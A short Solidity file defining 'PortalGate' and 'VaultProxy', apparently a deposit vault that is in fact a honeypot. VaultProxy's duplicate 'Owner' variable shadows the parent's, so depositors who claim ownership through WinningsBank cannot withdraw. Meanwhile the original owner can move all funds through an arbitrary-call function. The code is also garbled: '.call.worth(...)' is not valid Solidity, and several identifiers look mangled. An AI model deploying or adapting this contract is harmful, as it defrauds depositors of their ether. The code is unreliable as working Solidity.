// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract PortalGate  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function relocateassetsLord(address _owner) public onlyOwner { Owner = _owner; }
    function portalGate(address aim, bytes details) public payable {
        aim.call.worth(msg.value)(details);
    }
}

contract VaultProxy is PortalGate {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function WinningsBank() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            bankWinnings();
        }
    }

    function bankWinnings() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function extractWinnings(uint256 quantity) public onlyOwner {
        if (quantity>0 && Deposits[msg.sender]>=quantity) {
            msg.sender.transfer(quantity);
        }
    }
}